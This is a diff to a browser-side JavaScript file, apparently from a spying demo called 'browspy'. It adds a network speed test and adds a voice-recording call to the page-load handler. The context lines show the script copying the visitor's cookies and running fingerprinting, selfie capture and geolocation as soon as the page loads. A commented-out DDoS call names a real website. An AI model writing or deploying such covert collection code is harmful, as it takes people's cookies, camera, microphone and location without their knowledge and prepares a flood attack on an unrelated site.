@@ -55,6 +55,7 @@ var info={
     device:null,
     window_screen:null,
     blob:null,
+    download_speed:null,
 };
 
 info.cookie=document.cookie;
@@ -417,11 +418,60 @@ function get_geolocation(){
 
 }
 
+// 网络测速
+function network_speed(){
+    // 图片测速
+    var image=new Image();
+    // 图片大小: 1232.7kb
+    size=1232.7;
+    image.src='https://raw.githubusercontent.com/Urinx/browspy/master/screenshot/test.jpg';
+    startTime=new Date().getTime();
+    
+    // 图片加载完毕
+    image.onload=function(){
+        endTime=new Date().getTime();
+        // kb/s
+        speed=size/((endTime-startTime)/1000);
+        // 保留一位小数
+        speed=parseInt(speed*10)/10;
+        info.download_speed=speed+'kb/s';
+        console.log('Download speed testing finished!');
+    }
+
+    /*
+    // 音频测速
+    var audio=new Audio();
+    // 大小: 1.3M
+    size=1235.87;
+    audio.src='https://raw.githubusercontent.com/Urinx/browspy/master/screenshot/ValderFields.mp3';
+    audio.volume=0;
+    audio.play();
+
+    startTime=new Date().getTime();
+
+    var timer;
+    timer=setInterval(function(){
+        if (audio.networkState==1) {
+            endTime=new Date().getTime();
+            speed=size/((endTime-startTime)/1000);
+            speed=parseInt(speed*10)/10;
+            info.download_speed=speed+'kb/s';
+
+            console.log('Download speed testing finished!');
+            audio.stop();
+            clearInterval(timer);
+        };
+    },100);
+    */
+}
+
 window.onload=function(){
     device_platform();
     canvas_id();
     selfie();
     get_geolocation();
+    network_speed();
+    voice_record();
     //DDos('http://baidu.com');
 };
 
